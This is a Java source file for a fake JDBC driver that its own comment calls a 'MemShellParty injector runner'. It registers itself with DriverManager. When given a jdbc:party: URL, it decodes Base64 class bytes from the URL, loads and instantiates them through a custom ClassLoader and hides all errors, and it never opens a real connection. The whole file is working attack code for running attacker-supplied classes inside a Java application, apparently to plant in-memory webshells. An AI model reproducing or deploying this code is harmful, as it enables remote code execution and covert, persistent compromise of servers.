package party;

import java.sql.*;
import java.util.Base64;
import java.util.Properties;
import java.util.logging.Logger;

/**
 * Generic MemShellParty injector runner.
 * URL: jdbc:party:<Base64(injector class bytes)>
 */
public class PartyDriver implements Driver {
    static {
        try { DriverManager.registerDriver(new PartyDriver()); } catch (Throwable t) {}
    }
    public PartyDriver() {}
    public Connection connect(String url, Properties info) throws SQLException {
        if (url != null && url.startsWith("jdbc:party:")) {
            String b64 = url.substring("jdbc:party:".length());
            int q = b64.indexOf('?');
            if (q >= 0) b64 = b64.substring(0, q);
            try {
                byte[] bytes = Base64.getDecoder().decode(b64);
                ClassLoader parent = Thread.currentThread().getContextClassLoader();
                if (parent == null) parent = ClassLoader.getSystemClassLoader();
                Class<?> c = new PayloadLoader(parent).define(bytes);
                c.getDeclaredConstructor().newInstance();
            } catch (Throwable ignored) {}
        }
        return null;
    }
    static class PayloadLoader extends ClassLoader {
        PayloadLoader(ClassLoader parent) { super(parent); }
        Class<?> define(byte[] b) { return defineClass(null, b, 0, b.length); }
    }
    public boolean acceptsURL(String url) { return url != null && url.startsWith("jdbc:party:"); }
    public DriverPropertyInfo[] getPropertyInfo(String url, Properties info) { return new DriverPropertyInfo[0]; }
    public int getMajorVersion() { return 1; }
    public int getMinorVersion() { return 0; }
    public boolean jdbcCompliant() { return false; }
    public Logger getParentLogger() throws SQLFeatureNotSupportedException { throw new SQLFeatureNotSupportedException(); }
}
